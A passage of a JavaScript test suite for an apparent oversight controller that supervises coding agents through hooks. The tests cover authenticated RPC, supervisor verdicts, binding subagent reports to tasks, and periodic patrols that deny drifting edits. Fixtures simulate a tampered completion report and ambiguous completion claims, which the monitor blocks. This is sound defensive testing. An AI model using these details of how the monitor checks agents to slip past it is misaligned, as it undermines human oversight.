    verifierHandler: (options) => {
      attempts += 1;
      if (attempts === 1) return { ok: false, error: "Execution error",
        failure: { kind: "process", status: 1, retryable: true } };
      return { ok: true, verdict: { passed: true, gaps: [], evidence: ["semantic pass"] },
        packet: outcomePacket({ ...options, executionSteps: options.executionSteps }) };
    },
  });
  const stopped = h.controller.stop({ input: {
    hook_event_name: "Stop", transcript_path: h.transcript,
  } });
  assert.equal(stopped.output.decision, "approve");
  assert.equal(attempts, 2);
  const events = h.store.events();
  assert.ok(events.some((event) => event.type === "outcome_verifier_retrying"
    && event.retryable === true));
  assert.equal(events.some((event) => event.type === "outcome_verifier_failed"), false);
});

test("fresh supervisor command failures preserve actionable stderr", () => {
  const result = runFreshJsonCommand({
    cmd: ["fake"],
    input: "x",
    validate: () => true,
    execute: () => {
      const error = new Error("command failed");
      error.stderr = "Not logged in · Please run /login";
      throw error;
    },
  });
  assert.equal(result.ok, false);
  assert.match(result.error, /Not logged in/);
  assert.equal(result.failure.kind, "process");
  assert.equal(result.failure.retryable, false);
});

test("hook RPC is authenticated and returns the controller decision", async () => {
  const runId = "rpc-test";
  const socketPath = controllerSocketPath(runId);
  const token = createControllerToken();
  const controller = { handleHook: ({ input }) => ({ decision: { verdict: "allow" }, output: { echo: input.tool_name } }) };
  const rpc = await startControllerRpc({ controller, socketPath, token });
  try {
    const result = await requestController({
      socketPath,
      token,
      payload: { input: { tool_name: "Read" } },
      timeoutMs: 2000,
    });
    assert.equal(result.output.echo, "Read");
    await assert.rejects(requestController({
      socketPath,
      token: "wrong",
      payload: { input: {} },
      timeoutMs: 2000,
    }), /RPC_UNAUTHORIZED/);
  } finally {
    await rpc.close();
  }
});

test("controller RPC survives a client disconnect after the hook state transition", async () => {
  const moduleHref = new URL("../src/outsider-controller-rpc.js", import.meta.url).href;
  const source = `
    import net from "node:net";
    import path from "node:path";
    import { tmpdir } from "node:os";
    import { startControllerRpc, requestController } from ${JSON.stringify(moduleHref)};
    const socketPath = path.join(tmpdir(), "outsider-rpc-peer-close-" + process.pid + ".sock");
    const token = "peer-close-token";
    let calls = 0;
    const rpc = await startControllerRpc({
      socketPath, token,
      controller: { handleHook: async () => {
        calls += 1;
        if (calls === 1) await new Promise((resolve) => setTimeout(resolve, 100));
        return { output: { call: calls } };
      } },
    });
    const abandoned = net.createConnection(socketPath);
    await new Promise((resolve, reject) => {
      abandoned.once("connect", resolve);
      abandoned.once("error", reject);
    });
    abandoned.write(JSON.stringify({ token, payload: { input: { tool_name: "Stop" } } }) + "\\n");
    abandoned.on("error", () => undefined);
    abandoned.destroy(new Error("intentional peer abort"));
    await new Promise((resolve) => setTimeout(resolve, 180));
    const next = await requestController({
      socketPath, token, payload: { input: { tool_name: "Read" } }, timeoutMs: 2000,
    });
    if (next.output.call !== 2) throw new Error("RPC_STATE_TRANSITION_LOST");
    await rpc.close();
  `;
  const child = spawn(process.execPath, ["--input-type=module", "-e", source], {
    stdio: ["ignore", "pipe", "pipe"],
  });
  let stderr = "";
  child.stderr.on("data", (chunk) => { stderr += chunk; });
  child.stdout.resume();
  const code = await new Promise((resolve) => child.once("close", resolve));
  assert.equal(code, 0, stderr);
});

test("the shipped hook executable delegates to the controller instead of running a second kernel", async () => {
  const socketPath = controllerSocketPath("hook-entry-test");
  const token = createControllerToken();
  let calls = 0;
  const controller = {
    handleHook: ({ input }) => {
      calls += 1;
      return {
        decision: { verdict: "allow" },
        output: { hookSpecificOutput: { hookEventName: "PreToolUse",
          permissionDecision: "allow", additionalContext: `rpc:${input.tool_name}` } },
      };
    },
  };
  const rpc = await startControllerRpc({ controller, socketPath, token });
  try {
    const child = spawn(process.execPath, [path.resolve("bin/outsider-hook.mjs"), "claude-code"], {
      cwd: process.cwd(),
      env: { ...process.env, OUTSIDER_CONTROLLER_SOCKET: socketPath,
        OUTSIDER_CONTROLLER_TOKEN: token, OUTSIDER_BUDGET_MS: "5000" },
      stdio: ["pipe", "pipe", "pipe"],
    });
    let stdout = "", stderr = "";
    child.stdout.on("data", (chunk) => { stdout += chunk; });
    child.stderr.on("data", (chunk) => { stderr += chunk; });
    child.stdin.end(JSON.stringify({ hook_event_name: "PreToolUse", tool_name: "Read", tool_input: {} }));
    const code = await new Promise((resolve) => child.once("close", resolve));
    assert.equal(code, 0, stderr);
    assert.equal(calls, 1);
    const output = JSON.parse(stdout);
    assert.equal(output.hookSpecificOutput.additionalContext, "rpc:Read");
  } finally {
    await rpc.close();
  }
});

test("agent task tree isolates subagent intervention and verifies delegated work before merge", () => {
  let supervisorCalls = 0;
  const h = harness({
    decide: () => ({ verdict: "allow", proposed: { action: "delegate", irreversible: false } }),
    acceptanceResults: [
      { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" },
    ],
    supervisorHandler: ({ packet }) => {
      supervisorCalls += 1;
      assert.equal(packet.actor.agentId, "sub-1");
      assert.equal(packet.actor.parentAgentId, "main");
      assert.equal(packet.actor.delegatedTask.taskId, "task-1");
      if (supervisorCalls === 1) return { ok: true, verdict: {
        onTrack: false,
        drift: "子 agent 没有完成委派的 value=2 语义",
        plan: ["修改 src/value.js"],
        expectedNextActions: ["edit:src/value.js"],
        acceptanceRisk: "会失败",
      } };
      return { ok: true, verdict: {
        onTrack: true,
        drift: "",
        plan: [],
        expectedNextActions: [],
        acceptanceRisk: "low",
      } };
    },
  });
  const delegated = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse",
    tool_name: "Task",
    tool_use_id: "task-1",
    tool_input: { description: "implement value", prompt: "把 src/value.js 的公开 value 改成 2" },
    transcript_path: h.transcript,
  } });
  assert.equal(delegated.output.hookSpecificOutput.permissionDecision, "allow");
  const subTranscript = path.join(h.cwd, "agent-sub-1.jsonl");
  writeFileSync(subTranscript, "");
  const started = h.controller.handleHook({ input: {
    hook_event_name: "SubagentStart",
    agent_id: "sub-1",
    agent_type: "general-purpose",
    transcript_path: h.transcript,
    agent_transcript_path: subTranscript,
  } });
  assert.equal(started.output.hookSpecificOutput.hookEventName, "SubagentStart");
  assert.match(started.output.hookSpecificOutput.additionalContext, /冻结工作合同/);
  const first = h.controller.subagentStop({ input: {
    hook_event_name: "SubagentStop",
    agent_id: "sub-1",
    parent_agent_id: "main",
    transcript_path: h.transcript,
    agent_transcript_path: subTranscript,
  } });
  assert.equal(first.output.decision, "block");
  const correction = h.store.events().find((event) => event.type === "correction_emitted"
    && event.agentId === "sub-1");
  appendFileSync(subTranscript, `${correction.marker}\n`);
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 2;\n");
  const second = h.controller.subagentStop({ input: {
    hook_event_name: "SubagentStop",
    stop_hook_active: true,
    agent_id: "sub-1",
    parent_agent_id: "main",
    transcript_path: h.transcript,
    agent_transcript_path: subTranscript,
  } });
  assert.equal(second.output.decision, "approve");
  h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  const finished = h.controller.finish();
  assert.equal(finished.proof.complete, true, finished.proof.errors.join("; "));
  const state = h.store.readState();
  assert.equal(state.tasks["task-1"].status, "completed");
  assert.equal(state.agents["sub-1"].parentAgentId, "main");
  assert.equal(state.openInterventions?.["sub-1"], undefined);
  assert.equal(state.agents["sub-1"].transcriptPath, subTranscript);
  assert.equal(state.tasks["task-1"].taskLinkConfidence, "single-pending-task");
  const callsAfterCompletion = supervisorCalls;
  const repeated = h.controller.subagentStop({ input: {
    hook_event_name: "SubagentStop",
    agent_id: "sub-1",
    parent_agent_id: "main",
    transcript_path: h.transcript,
    agent_transcript_path: subTranscript,
  } });
  assert.equal(repeated.output.decision, "approve");
  assert.equal(supervisorCalls, callsAfterCompletion,
    "a lifecycle echo cannot buy a second semantic verification for a completed task");
  assert.ok(h.store.events().some((event) => event.type === "task_delivery_already_verified"
    && event.taskId === "task-1"));
});

test("real Codex spawn/read/SubagentStop/wait shapes bind an opaque task and exact child report", () => {
  const encryptedMessage = `gAAAAA${"a".repeat(120)}=`;
  const childReport = "只读检查已完成：`answer()` 当前返回值为 `1`。";
  const finalReport = "子 Agent 已完成只读检查并报告 value=1；主 Agent 已等待其完成。";
  let subagentPacket = null;
  let finalVerification = null;
  const h = harness({
    decide: () => ({ verdict: "allow", proposed: { action: "delegate", irreversible: false } }),
    acceptanceResults: [
      { ran: true, passed: true, exit: 0, command: "npm test", output: "ok" },
    ],
    supervisorHandler: ({ packet }) => {
      subagentPacket = packet;
      assert.equal(packet.actor.agentId, "codex-child-1");
      assert.equal(packet.actor.parentAgentId, "main");
      assert.equal(packet.actor.delegatedTask.taskId, "spawn-codex-1");
      assert.equal(packet.actor.delegatedTask.description, "readonly_answer_check");
      assert.equal(packet.actor.delegatedTask.prompt, null,
        "host ciphertext is never presented as readable task prose");
      assert.equal(packet.actor.delegatedTask.promptBinding.visibility, "host-encrypted");
      assert.equal(packet.actor.delegatedTask.promptBinding.hostConfidential, true);
      assert.match(packet.actor.delegatedTask.promptBinding.payloadHash, /^sha256:[a-f0-9]{64}$/u);
      assert.equal(packet.actor.delegatedTask.completionReport.transcriptBound, true);
      assert.equal(packet.actor.delegatedTask.completionReport.text, childReport);
      assert.equal(packet.actor.delegatedTask.completionReport.source,
        "SubagentStop.last_assistant_message");
      assert.ok(packet.readEvidence.some((entry) => entry.source === "shell-command"
        && entry.files.includes("src/value.js")),
      "controller-sealed child Pre/Post is used even when rollout wraps it as opaque exec");
      assert.ok(packet.trajectory.some((step) => step.agentId === "codex-child-1"
        && step.tool === "Bash" && step.action.includes("src/value.js")
        && step.exit === 0 && step.executed === true));
      assert.equal(packet.trajectory.some((step) => step.agentId === "codex-child-1"
        && (step.isEdit || step.isTest || /spawn_agent/iu.test(step.tool))), false);
      assert.equal(packet.decisionScope.kind, "intermediate-subagent-task-delivery");
      assert.equal(packet.decisionScope.taskId, "spawn-codex-1");
      assert.equal(packet.decisionScope.agentId, "codex-child-1");
      assert.equal(packet.decisionScope.clearanceEvidenceReady, true);
      assert.equal(packet.decisionScope.actorEvidence.durableActions.length, 1);
      return { ok: true, verdict: { onTrack: true, drift: "", plan: [],
        expectedNextActions: [], acceptanceRisk: "low" } };
    },
    clearanceAuditorHandler: ({ evidence, proposal }) => {
      assert.equal(evidence.decisionScope.kind, "intermediate-subagent-task-delivery");
      assert.equal(evidence.decisionScope.clearanceEvidenceReady, true);
      assert.deepEqual(proposal.plan, [], "onTrack child clearance cannot carry parent work");
      assert.deepEqual(proposal.expectedNextActions, []);
      return { ok: true, packet: { evidence, proposedClearance: proposal }, verdict: {
        passed: true, errors: [],
        verifiedFacts: ["the exact child slice is complete and the parent workflow is out of scope"],
      } };
    },
    verifierHandler: (options) => {
      finalVerification = options;
      assert.ok(options.executionSteps.some((step) => step.agentId === "codex-child-1"
        && String(step.action).includes("src/value.js") && step.exit === 0));
      assert.ok(options.executionSteps.some((step) => step.agentId === "main"
        && step.toolName === "collaborationwait_agent" && step.exit === 0));
      assert.ok(options.controllerProcessEvidence.some((event) =>
        event.type === "subagent_report_bound" && event.taskId === "spawn-codex-1"
        && event.transcriptBound === true));
      assert.ok(options.controllerProcessEvidence.some((event) =>
        event.type === "task_completed" && event.taskId === "spawn-codex-1"
        && event.independentlyVerified === true));
      const delegated = options.terminationEvidence.delegatedTaskEvidence.tasks
        .find((task) => task.id === "spawn-codex-1");
      assert.equal(delegated.promptBinding.visibility, "host-encrypted");
      assert.equal(delegated.completionReport.transcriptBound, true);
      assert.equal(delegated.completionReport.text, childReport);
      assert.equal(options.terminationEvidence.workerFinalReport.transcriptBound, true);
      return { ok: true, verdict: { passed: true, gaps: [],
        evidence: ["controller-bound child handoff and main wait are complete"] } };
    },
  });
  const delegated = h.controller.preTool({ agent: "codex", input: {
    hook_event_name: "PreToolUse",
    tool_name: "collaborationspawn_agent",
    tool_use_id: "spawn-codex-1",
    tool_input: { task_name: "readonly_answer_check", fork_turns: "all",
      message: encryptedMessage },
    session_id: "codex-main-session",
    turn_id: "codex-main-turn",
    transcript_path: h.transcript,
  } });
  assert.equal(delegated.output.hookSpecificOutput.permissionDecision, "allow");
  assert.equal(h.store.readState().tasks["spawn-codex-1"].prompt, encryptedMessage);
  assert.equal(h.store.readState().tasks["spawn-codex-1"].promptVisibility, "host-encrypted");
  assert.equal(h.store.readState().tasks["spawn-codex-1"].description,
    "readonly_answer_check");
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "collaborationspawn_agent",
    tool_use_id: "spawn-codex-1",
    tool_input: { task_name: "readonly_answer_check", fork_turns: "all",
      message: encryptedMessage },
    tool_response: '{"task_name":"/root/readonly_answer_check"}',
    session_id: "codex-main-session", turn_id: "codex-main-turn",
    transcript_path: h.transcript,
  } });

  const childTranscript = path.join(h.cwd, "agent-codex-child-1.jsonl");
  writeFileSync(childTranscript, "");
  const started = h.controller.handleHook({ agent: "codex", input: {
    hook_event_name: "SubagentStart",
    agent_id: "codex-child-1", agent_type: "default",
    session_id: "codex-main-session", turn_id: "codex-child-turn",
    transcript_path: childTranscript,
  } });
  assert.match(started.output.hookSpecificOutput.additionalContext, /readonly_answer_check/u);
  assert.match(started.output.hookSpecificOutput.additionalContext, /宿主加密/u);
  assert.doesNotMatch(started.output.hookSpecificOutput.additionalContext, /gAAAAA/u);
  assert.equal(h.store.readState().agents["codex-child-1"].taskId, "spawn-codex-1");
  assert.equal(h.store.readState().tasks["spawn-codex-1"].taskLinkConfidence,
    "single-pending-task");
  assert.equal(h.store.events().some((event) => event.type === "task_tree_gap"), false);

  const childRead = {
    agent_id: "codex-child-1", agent_type: "default",
    session_id: "codex-main-session", turn_id: "codex-child-turn",
    transcript_path: childTranscript,
    tool_name: "Bash", tool_use_id: "exec-child-read",
    tool_input: { command: "sed -n '1,120p' src/value.js" },
  };
  h.controller.preTool({ agent: "codex", input: {
    ...childRead, hook_event_name: "PreToolUse",
  } });
  h.controller.postTool({ input: {
    ...childRead, hook_event_name: "PostToolUse",
    tool_response: "export const value = 1;\n",
  } });
  appendFileSync(childTranscript, `${JSON.stringify({
    timestamp: "2026-08-24T00:00:01.000Z", type: "response_item",
    payload: { type: "message", role: "assistant",
      content: [{ type: "output_text", text: childReport }], phase: "final_answer" },
  })}\n`);

  const subagentStopInput = {
    hook_event_name: "SubagentStop",
    agent_id: "codex-child-1", agent_type: "default",
    session_id: "codex-main-session", turn_id: "codex-child-turn",
    transcript_path: h.transcript,
    agent_transcript_path: childTranscript,
  };
  const mismatched = h.controller.handleHook({ agent: "codex", input: {
    ...subagentStopInput, last_assistant_message: "tampered completion report",
  } });
  assert.equal(mismatched.output.decision, "block");
  assert.match(mismatched.output.reason, /未能.*逐字绑定/u);
  assert.equal(h.store.readState().tasks["spawn-codex-1"].status, "running");

  const stopped = h.controller.handleHook({ agent: "codex", input: {
    ...subagentStopInput, last_assistant_message: childReport,
  } });
  assert.equal(stopped.output.decision, "approve");
  assert.equal(h.store.readState().tasks["spawn-codex-1"].status, "completed");
  assert.equal(h.store.readState().tasks["spawn-codex-1"].independentlyVerified, true);
  assert.equal(h.store.readState().tasks["spawn-codex-1"].completionReport.text,
    childReport);
  assert.ok(subagentPacket);
  assert.ok(h.store.events().some((event) => event.type === "supervisor_clearance_audit"
    && event.passed === true && event.internallyConsistent === true));

  const wait = {
    hook_event_name: "PreToolUse", tool_name: "collaborationwait_agent",
    tool_use_id: "wait-child", tool_input: { timeout_ms: 3600000 },
    session_id: "codex-main-session", turn_id: "codex-main-turn",
    transcript_path: h.transcript,
  };
  h.controller.preTool({ agent: "codex", input: wait });
  h.controller.postTool({ input: {
    ...wait, hook_event_name: "PostToolUse",
    tool_response: '{"message":"Wait completed.","timed_out":false}',
  } });
  appendFileSync(h.transcript, `${JSON.stringify({
    timestamp: "2026-08-24T00:00:02.000Z", type: "response_item",
    payload: { type: "agent_message", author: "/root/readonly_answer_check",
      recipient: "/root", content: [{ type: "input_text", text: childReport }] },
  })}\n${JSON.stringify({
    timestamp: "2026-08-24T00:00:03.000Z", type: "response_item",
    payload: { type: "message", role: "assistant",
      content: [{ type: "output_text", text: finalReport }], phase: "final_answer" },
  })}\n`);
  const finished = h.controller.stop({ agent: "codex", input: {
    hook_event_name: "Stop", last_assistant_message: finalReport,
    session_id: "codex-main-session", turn_id: "codex-main-turn",
    transcript_path: h.transcript,
  } });
  assert.equal(finished.output.decision, "approve");
  assert.ok(finalVerification);
});

test("concurrent unassigned subagent tasks stay explicitly ambiguous instead of being guessed", () => {
  const h = harness({
    decide: () => ({ verdict: "allow", proposed: { action: "delegate", irreversible: false } }),
  });
  for (const id of ["task-a", "task-b"]) {
    h.controller.preTool({ input: {
      hook_event_name: "PreToolUse",
      tool_name: "Agent",
      tool_use_id: id,
      tool_input: { description: id, prompt: `do ${id}` },
      transcript_path: h.transcript,
    } });
  }
  const childTranscript = path.join(h.cwd, "agent-ambiguous.jsonl");
  writeFileSync(childTranscript, "");
  h.controller.subagentStart({ input: {
    hook_event_name: "SubagentStart",
    agent_id: "ambiguous",
    transcript_path: h.transcript,
    agent_transcript_path: childTranscript,
  } });
  const state = h.store.readState();
  assert.equal(state.agents.ambiguous.taskId, null);
  assert.equal(state.agents.ambiguous.agentKind, "subagent");
  assert.equal(state.tasks["task-a"].assigneeAgentId, null);
  assert.equal(state.tasks["task-b"].assigneeAgentId, null);
  assert.ok(h.store.events().some((event) => event.type === "task_link_ambiguous"));
  assert.ok(h.store.events().some((event) => event.type === "task_tree_gap"));

  const report = "ambiguous child claims completion";
  appendFileSync(childTranscript, `${JSON.stringify({
    timestamp: "2026-08-24T00:00:00.000Z", type: "response_item",
    payload: { type: "message", role: "assistant",
      content: [{ type: "output_text", text: report }], phase: "final_answer" },
  })}\n`);
  const ambiguousStop = h.controller.handleHook({ agent: "codex", input: {
    hook_event_name: "SubagentStop", agent_id: "ambiguous",
    last_assistant_message: report, transcript_path: h.transcript,
    agent_transcript_path: childTranscript,
  } });
  assert.equal(ambiguousStop.output.decision, "block",
    "a report cannot complete one of several unbound tasks by guess");
  assert.match(ambiguousStop.output.reason, /无法唯一绑定/u);
  assert.equal(h.store.readState().tasks["task-a"].status, "delegated");
  assert.equal(h.store.readState().tasks["task-b"].status, "delegated");

  const anonymousStop = h.controller.handleHook({ agent: "codex", input: {
    hook_event_name: "SubagentStop", last_assistant_message: report,
    transcript_path: childTranscript,
  } });
  assert.equal(anonymousStop.output.decision, "block");
  assert.match(anonymousStop.output.reason, /缺少可绑定的子 Agent 身份/u);
});

test("failed corrections are re-diagnosed with history, then terminate red instead of blocking forever", () => {
  const red = { ran: true, passed: false, exit: 1, command: "npm test", output: "still red" };
  const historyLengths = [];
  const h = harness({
    acceptanceResults: [red, red, red, red, red, red],
    supervisorHandler: ({ packet }) => {
      historyLengths.push(packet.priorInterventions.length);
      return { ok: true, verdict: {
        onTrack: false,
        drift: "前一份修复计划没有消除失败",
        plan: ["换一个根因假设重新修复"],
        expectedNextActions: ["edit:src/value.js"],
        acceptanceRisk: "仍会失败",
      } };
    },
  });
  for (let attempt = 0; attempt < 3; attempt += 1) {
    const result = h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
    assert.equal(result.output.decision, "block");
  }
  const exhausted = h.controller.stop({ input: { hook_event_name: "Stop", transcript_path: h.transcript } });
  assert.equal(exhausted.output.decision, "approve", "the line terminates red instead of becoming a permanent wall");
  assert.deepEqual(historyLengths.map((value) => value > 0), [false, true, true]);
  const events = h.store.events();
  assert.equal(events.filter((event) => event.type === "correction_emitted").length, 3);
  assert.ok(events.some((event) => event.type === "intervention_budget_exhausted"));
  assert.ok(events.some((event) => event.type === "run_cannot_recover"));
});

test("a thousand safe boundaries retain monotonic run identity without opening phantom interventions", () => {
  const h = harness({
    decide: () => ({ verdict: "allow", proposed: { action: "read", irreversible: false } }),
    supervisorHandler: () => ({ ok: true, verdict: {
      onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
    } }),
  });
  for (let index = 0; index < 1000; index += 1) {
    const result = h.controller.preTool({ input: {
      hook_event_name: "PreToolUse",
      tool_name: "Read",
      tool_input: { file_path: `src/file-${index % 7}.js` },
      transcript_path: h.transcript,
    } });
    assert.equal(result.output.hookSpecificOutput.permissionDecision, "allow");
  }
  const events = h.store.events();
  assert.equal(new Set(events.map((event) => event.runId)).size, 1);
  assert.equal(events.every((event, index) => event.seq === index + 1), true);
  assert.equal(events.some((event) => event.type === "correction_emitted"), false);
  assert.ok(events.some((event) => event.type === "semantic_patrol_passed"));
  const state = h.store.readState();
  assert.deepEqual(Object.keys(state.agents), ["main"]);
  assert.equal(state.semanticPatrols.main.toolBoundaries, 1000);
});

test("periodic semantic patrol actively catches quiet architectural drift without a detector trigger", () => {
  let calls = 0;
  const h = harness({
    semanticPatrolEvery: 3,
    decide: () => ({ verdict: "allow", proposed: { action: "edit", irreversible: false } }),
    supervisorHandler: ({ packet }) => {
      calls += 1;
      assert.equal(packet.trigger, "periodic-semantic-patrol:3");
      assert.equal(packet.proposedTool.name, "Edit");
      assert.ok(packet.coordination);
      return { ok: true, verdict: {
        onTrack: false,
        drift: "连续局部补丁正在把冻结的公开机制改成条件分支堆叠",
        plan: ["停下局部补丁，恢复统一的状态机边界"],
        expectedNextActions: ["edit:src/value.js"],
        acceptanceRisk: "visible tests may pass while architecture drifts",
      } };
    },
  });
  for (let index = 1; index <= 3; index += 1) {
    const result = h.controller.preTool({ input: {
      hook_event_name: "PreToolUse",
      tool_name: "Edit",
      tool_use_id: `edit-${index}`,
      tool_input: { file_path: "src/value.js", old_string: "x", new_string: "y" },
      transcript_path: h.transcript,
    } });
    assert.equal(result.output.hookSpecificOutput.permissionDecision, index === 3 ? "deny" : "allow");
    if (index === 3) assert.match(result.output.hookSpecificOutput.permissionDecisionReason,
      /主动周期性语义巡检/);
  }
  assert.equal(calls, 1);
  const events = h.store.events();
  assert.ok(events.some((event) => event.type === "semantic_patrol_due"));
  assert.ok(events.some((event) => event.type === "semantic_patrol_finished"
    && event.status === "correction"));
});

test("periodic semantic patrol counts Read and runs while a mechanical intervention is open", () => {
  let supervisorCalls = 0;
  let decisions = 0;
  const h = harness({
    semanticPatrolEvery: 4,
    decide: () => (++decisions === 1 ? {
      verdict: "warn", reason: "mechanical drift", corrective: "repair",
      proposed: { action: "edit", irreversible: false },
    } : { verdict: "allow", proposed: { action: "read", irreversible: false } }),
    acceptanceResults: [{ ran: true, passed: false, exit: 1,
      command: "npm test", output: "red" }],
    supervisorHandler: ({ packet }) => {
      supervisorCalls += 1;
      if (supervisorCalls === 1) return { ok: true, verdict: {
        onTrack: false, drift: "mechanical issue",
        plan: ["first repair"], expectedNextActions: ["edit:src/value.js"],
        acceptanceRisk: "red",
      } };
      assert.equal(packet.trigger, "periodic-semantic-patrol:4");
      return { ok: true, verdict: {
        onTrack: false, drift: "the first local repair still misses the frozen architecture",
        plan: ["replace the local patch with the contract mechanism"],
        expectedNextActions: ["edit:src/value.js"], acceptanceRisk: "semantic drift",
      } };
    },
  });
  const first = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Edit",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
  } });
  assert.equal(first.output.hookSpecificOutput.permissionDecision, "deny");
  const original = h.store.readState().openInterventions.main.id;
  for (let index = 0; index < 2; index += 1) {
    const read = h.controller.preTool({ input: {
      hook_event_name: "PreToolUse", tool_name: "Read",
      tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
    } });
    assert.equal(read.output.hookSpecificOutput.permissionDecision, "allow");
  }
  const patrolled = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Read",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
  } });
  assert.equal(patrolled.output.hookSpecificOutput.permissionDecision, "deny");
  assert.match(patrolled.output.hookSpecificOutput.permissionDecisionReason, /替换/);
  assert.equal(h.store.readState().semanticPatrols.main.toolBoundaries, 4);
  assert.notEqual(h.store.readState().openInterventions.main.id, original);
  assert.ok(h.store.events().some((event) => event.type
    === "intervention_superseded_by_semantic_patrol" && event.interventionId === original));
});

test("periodic patrol cannot supersede an observed correction before its first effect opportunity", () => {
  let decisions = 0;
  let supervisorCalls = 0;
  const h = harness({
    semanticPatrolEvery: 2,
    decide: () => (++decisions === 1 ? {
      verdict: "warn", reason: "mechanical drift", corrective: "repair",
      proposed: { action: "edit", irreversible: false },
    } : { verdict: "allow", proposed: { action: "read", irreversible: false } }),
    acceptanceResults: [{ ran: true, passed: false, exit: 1,
      command: "npm test", output: "red" }],
    supervisorHandler: () => {
      supervisorCalls += 1;
      return { ok: true, verdict: {
        onTrack: false, drift: "repair src/value.js",
        plan: ["repair the implementation"],
        expectedNextActions: ["edit:src/value.js"], acceptanceRisk: "red",
      } };
    },
  });
  const first = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Edit",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
  } });
  assert.equal(first.output.hookSpecificOutput.permissionDecision, "deny");
  const correction = h.store.events().find((event) => event.type === "correction_emitted");
  assert.ok(correction?.marker);
  appendFileSync(h.transcript,
    `${JSON.stringify({ type: "user", message: { content: correction.marker } })}\n`);

  const opportunity = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Read", tool_use_id: "first-opportunity",
    tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
  } });
  assert.equal(opportunity.output.hookSpecificOutput.permissionDecision, "allow");
  assert.equal(supervisorCalls, 1, "the periodic patrol does not buy a duplicate diagnosis");
  assert.equal(h.store.readState().openInterventions.main.id, correction.interventionId);
  assert.equal(h.store.readState().openInterventions.main.correctionObserved, true);
  const events = h.store.events();
  const deferred = events.find((event) => event.type
    === "semantic_patrol_deferred_pending_correction_effect");
  assert.equal(deferred?.interventionId, correction.interventionId);
  assert.equal(deferred?.correctionAuthorityHash, correction.correctionAuthorityHash);
  assert.equal(events.some((event) => event.type
    === "intervention_superseded_by_semantic_patrol"), false);
});

test("periodic patrol preserves an effected TaskCompleted correction until its native retry", () => {
  let supervisorCalls = 0;
  const h = harness({
    semanticPatrolEvery: 1,
    supervisorHandler: () => {
      supervisorCalls += 1;
      return { ok: true, verdict: {
        onTrack: false, drift: "integration source is wrong",
        plan: ["repair src/value.js", "rerun acceptance"],
        expectedNextActions: ["edit:src/value.js", "run:acceptance"],
        acceptanceRisk: "red",
      } };
    },
  });
  const correction = h.controller.supervise({
    input: { hook_event_name: "TaskCompleted", transcript_path: h.transcript },
    agent: "claude-code",
    boundary: "TaskCompleted",
    trigger: "team-task-delivery:3",
    acceptanceResult: { ran: true, passed: false, exit: 1,
      command: "npm test", output: "integration red" },
    actor: { agentId: "main", agentKind: "main", task: null },
  });
  assert.equal(correction.status, "correction");
  appendFileSync(h.transcript,
    `${JSON.stringify({ type: "user", message: { content: correction.correction } })}\n`);
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 2;\n");

  for (let index = 0; index < 7; index += 1) {
    const result = h.controller.preTool({ input: {
      hook_event_name: "PreToolUse", tool_name: "Read", tool_use_id: `native-wait-${index}`,
      tool_input: { file_path: "src/value.js" }, transcript_path: h.transcript,
    } });
    assert.equal(result.output.hookSpecificOutput.permissionDecision, "allow");
  }
  const open = h.store.readState().openInterventions.main;
  assert.equal(open.id, correction.interventionId);
  assert.equal(open.correctionObserved, true);
  assert.equal(open.effectObserved, true);
  assert.equal(supervisorCalls, 1,
    "neither patrol nor generic follow-up may replace the native-boundary intervention");
  const events = h.store.events();
  assert.ok(events.some((event) => event.type
    === "semantic_patrol_deferred_pending_correction_resolution"
    && event.interventionId === correction.interventionId));
  assert.ok(events.some((event) => event.type
    === "intervention_followup_deferred_to_task_completion"
    && event.interventionId === correction.interventionId));
  assert.equal(events.some((event) => event.type
    === "intervention_superseded_by_semantic_patrol"), false);
});

test("the first patrol waits for enough completed evidence instead of buying an empty verdict", () => {
  let supervisorCalls = 0;
  const h = harness({
    semanticPatrolEvery: 4,
    semanticPatrolMinEvidenceSteps: 6,
    decide: () => ({ verdict: "allow", proposed: { action: "read", irreversible: false } }),
    supervisorHandler: ({ packet }) => {
      supervisorCalls += 1;
      assert.equal(packet.steps >= 6, true);
      assert.deepEqual(packet.filesRead, ["src/value.js"]);
      return { ok: true, verdict: {
        onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
      } };
    },
  });
  /* Claude's real session transcript is host state outside the repository. If
     the fixture lived in cwd, its own growth would look like a source diff and
     intentionally activate the controller's early-after-edit patrol path. */
  const patrolTranscript = path.join(
    mkdtempSync(path.join(tmpdir(), "outsider-patrol-transcript-")), "session.jsonl");
  writeFileSync(patrolTranscript, "");
  for (let index = 1; index <= 7; index += 1) {
    const result = h.controller.preTool({ input: {
      hook_event_name: "PreToolUse", tool_name: "Read", tool_use_id: `read-${index}`,
      tool_input: { file_path: "src/value.js" }, transcript_path: patrolTranscript,
    } });
    assert.equal(result.output.hookSpecificOutput.permissionDecision, "allow");
    appendFileSync(patrolTranscript,
      `${JSON.stringify({ type: "assistant", message: { content: [{
        type: "tool_use", id: `read-${index}`, name: "Read",
        input: { file_path: "src/value.js" },
      }] } })}\n${JSON.stringify({ type: "user", message: { content: [{
        type: "tool_result", tool_use_id: `read-${index}`, content: "export const value = 1;",
      }] } })}\n`);
  }
  const events = h.store.events();
  const deferred = events.find((event) => event.type
    === "semantic_patrol_deferred_insufficient_evidence");
  assert.equal(deferred.toolBoundaries, 4);
  assert.equal(deferred.observedSteps, 3);
  assert.equal(deferred.nextEvidenceCheckAt, 7);
  assert.ok(events.some((event) => event.type === "semantic_patrol_passed"
    && event.toolBoundaries === 7));
  assert.equal(supervisorCalls, 1);
});

test("the patrol clock is persisted before early-return gates and reserves completion calls", () => {
